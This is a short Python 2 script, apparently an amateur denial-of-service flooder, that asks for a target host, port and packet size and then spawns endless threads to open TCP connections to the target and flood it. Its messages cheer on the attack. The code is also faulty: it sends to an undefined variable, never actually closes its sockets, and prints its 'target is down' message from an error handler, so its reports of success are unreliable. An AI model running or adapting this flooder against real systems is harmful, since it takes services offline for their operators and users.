#!/system/bin/python
from os import *
from socket import *
from string import *
from time import *
from thread import *
import sys
import os
import random

if sys.platform == "linux2":
        os.system("clear")
elif sys.platform == "win32":
        os.system("cls")
else:
        os.system("clear")
print("\033[1;32m")
os.system("figlet Zoro")
print("Creador By: Zoro")
print("\033[1;31m")
host = raw_input("Float->")
print("Porta:")
port = input("Float-> ")
print("Quantidade De attaques:")
package = input("Float-> ")
packet = random._urandom(package)


def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (ip,port))
        sleep(99)
        sock1.close
    except:
        print "[+] 74rg37 15 D0wn! K33p 4774Ck1ng!!"

n = 0


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Y0ur 1n73rn37 h45 b33n fuck3ry, Pl3453 ch3ck 17"
    print("[=]Attacking!!")
    sleep(0.1)